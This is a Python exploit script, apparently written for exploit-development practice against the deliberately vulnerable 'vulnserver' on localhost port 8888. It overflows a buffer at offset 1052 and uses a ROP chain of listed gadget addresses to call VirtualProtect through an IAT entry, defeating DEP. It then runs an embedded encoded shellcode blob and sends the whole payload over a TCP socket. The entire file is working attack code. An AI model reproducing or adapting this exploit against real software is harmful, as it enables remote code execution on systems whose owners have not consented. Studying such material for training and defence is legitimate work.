import struct
import socket


def shellcode():
    buf =  b"\x90" * 50
    buf += b"\xda\xd3\xba\x31\x86\xf7\xdb\xd9\x74\x24\xf4\x5f"
    buf += b"\x33\xc9\xb1\x52\x31\x57\x17\x03\x57\x17\x83\xde"
    buf += b"\x7a\x15\x2e\xdc\x6b\x58\xd1\x1c\x6c\x3d\x5b\xf9"
    buf += b"\x5d\x7d\x3f\x8a\xce\x4d\x4b\xde\xe2\x26\x19\xca"
    buf += b"\x71\x4a\xb6\xfd\x32\xe1\xe0\x30\xc2\x5a\xd0\x53"
    buf += b"\x40\xa1\x05\xb3\x79\x6a\x58\xb2\xbe\x97\x91\xe6"
    buf += b"\x17\xd3\x04\x16\x13\xa9\x94\x9d\x6f\x3f\x9d\x42"
    buf += b"\x27\x3e\x8c\xd5\x33\x19\x0e\xd4\x90\x11\x07\xce"
    buf += b"\xf5\x1c\xd1\x65\xcd\xeb\xe0\xaf\x1f\x13\x4e\x8e"
    buf += b"\xaf\xe6\x8e\xd7\x08\x19\xe5\x21\x6b\xa4\xfe\xf6"
    buf += b"\x11\x72\x8a\xec\xb2\xf1\x2c\xc8\x43\xd5\xab\x9b"
    buf += b"\x48\x92\xb8\xc3\x4c\x25\x6c\x78\x68\xae\x93\xae"
    buf += b"\xf8\xf4\xb7\x6a\xa0\xaf\xd6\x2b\x0c\x01\xe6\x2b"
    buf += b"\xef\xfe\x42\x20\x02\xea\xfe\x6b\x4b\xdf\x32\x93"
    buf += b"\x8b\x77\x44\xe0\xb9\xd8\xfe\x6e\xf2\x91\xd8\x69"
    buf += b"\xf5\x8b\x9d\xe5\x08\x34\xde\x2c\xcf\x60\x8e\x46"
    buf += b"\xe6\x08\x45\x96\x07\xdd\xca\xc6\xa7\x8e\xaa\xb6"
    buf += b"\x07\x7f\x43\xdc\x87\xa0\x73\xdf\x4d\xc9\x1e\x1a"
    buf += b"\x06\x36\x76\x09\x02\xde\x85\x51\xbb\x43\x03\xb7"
    buf += b"\xd1\x6b\x45\x60\x4e\x15\xcc\xfa\xef\xda\xda\x87"
    buf += b"\x30\x50\xe9\x78\xfe\x91\x84\x6a\x97\x51\xd3\xd0"
    buf += b"\x3e\x6d\xc9\x7c\xdc\xfc\x96\x7c\xab\x1c\x01\x2b"
    buf += b"\xfc\xd3\x58\xb9\x10\x4d\xf3\xdf\xe8\x0b\x3c\x5b"
    buf += b"\x37\xe8\xc3\x62\xba\x54\xe0\x74\x02\x54\xac\x20"
    buf += b"\xda\x03\x7a\x9e\x9c\xfd\xcc\x48\x77\x51\x87\x1c"
    buf += b"\x0e\x99\x18\x5a\x0f\xf4\xee\x82\xbe\xa1\xb6\xbd"
    buf += b"\x0f\x26\x3f\xc6\x6d\xd6\xc0\x1d\x36\xf6\x22\xb7"
    buf += b"\x43\x9f\xfa\x52\xee\xc2\xfc\x89\x2d\xfb\x7e\x3b"
    buf += b"\xce\xf8\x9f\x4e\xcb\x45\x18\xa3\xa1\xd6\xcd\xc3"
    buf += b"\x16\xd6\xc7"

    return buf


#\x00\x0A\x0D

IAT = 0x69aa7ea4 # (VirtualProtectStub IAT entry)

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8888
target = (TARGET_IP, TARGET_PORT)  # vulnserver


crash = 2000  # change me
offset = 1052

va = b""
va += struct.pack("<L", 0x45454545)                # VirtualProtect address
va += struct.pack("<L", 0x46464646)                # shellcode return address to return to after VirtualProtect is called
va += struct.pack("<L", 0x47474747)                # lpAddress (same as above)
va += struct.pack("<L", 0x48484848)                # dwSize         (size of shellcode, 0x300 or so)
va += struct.pack("<L", 0x49494949)                # flNewProtect   (0x40)
va += struct.pack("<L", 0x61f8c004)                # lpflOldProtect (some writable memory address)

buffer = b""

gadgets = [
    # align ebx start of the va
    0x61e63999, # inc ebx ; ret  ;
    0x61e63999, # inc ebx ; ret  ;
    0x61e63999, # inc ebx ; ret  ;
    0x61e63999, # inc ebx ; ret  ;

    0x61e63999, # inc ebx ; ret  ;
    0x61e63999, # inc ebx ; ret  ;
    0x61e63999, # inc ebx ; ret  ;
    0x61e63999, # inc ebx ; ret  ;

    0x61e63999, # inc ebx ; ret  ;
    
    # put virtualprotect address

    0x61b612db, # pop eax ; ret  ;
    IAT,
    0x61bb8cb3, # mov eax, dword [eax] ; ret  ;
    0x61b99285, # mov dword [ebx], eax ; mov eax, ebx ; pop ebx ; ret  ;
    0x41414141, # dummy for pop ebx

    # put return address ( current pointer + 0x100)
    0x61b7e11c, # add eax, 0x04 ; ret  ;

    0x61be6142, # xor edx, edx ; ret  ;
    0x61d76f2f, # add edx, eax ; add al, 0x00 ; retn 0x0004 ;
    0x61b41011, # ret  ;  ROPNOP
    0x41414141, # retn 0x0004 ;

    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61b7e3ec, # add eax, 0x10 ; ret  ;

    0x61f2b0b3, # mov dword [edx], eax ; ret  ;

    # put lpAddress

    0x61b455fa, # inc edx ; ret  ;
    0x61b455fa, # inc edx ; ret  ;
    0x61b455fa, # inc edx ; ret  ;
    0x61b455fa, # inc edx ; ret  ;

    0x61f2b0b3, # mov dword [edx], eax ; ret  ;

    # put dwSize

    0x61b455fa, # inc edx ; ret  ;
    0x61b455fa, # inc edx ; ret  ;
    0x61b455fa, # inc edx ; ret  ;
    0x61b455fa, # inc edx ; ret  ;

    0x61b79120, # xor eax, eax ; ret  ;

    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;

    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;

    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;

    0x61f2b0b3, # mov dword [edx], eax ; ret  ;

    # put flNewProtect
    
    0x61b455fa, # inc edx ; ret  ;
    0x61b455fa, # inc edx ; ret  ;
    0x61b455fa, # inc edx ; ret  ;
    0x61b455fa, # inc edx ; ret  ;

    0x61b79120, # xor eax, eax ; ret  ;

    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61f2b0b3, # mov dword [edx], eax ; ret  ;

    # mov esp

    # edx - 0x14 --> ebp
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;

    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;

    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;

    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;

    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;

    0x61dcffca, # xchg eax, edx ; ret  ;
    0x61c17257, # xchg eax, ebp ; ret  ; 
    0x61b4157d, # leave  ; ret  ;
]

for gadget in gadgets:
    buffer += struct.pack("<L", gadget)

payload = b"A"*offset
payload += struct.pack("<L", 0x61b9eab6) # push esp ; pop ebx ; pop esi ; ret  ;
payload += struct.pack("<L", 0x41414141) # dummy for pop esi
payload += struct.pack("<L", 0x61b79163) # add esp, 0x1C ; ret  ;
payload += va
payload += buffer
payload += shellcode()
payload += b"C"*(crash - len(payload))

with socket.create_connection(target) as sock:

    sent = sock.send(payload)
    print(f"sent {sent} bytes")
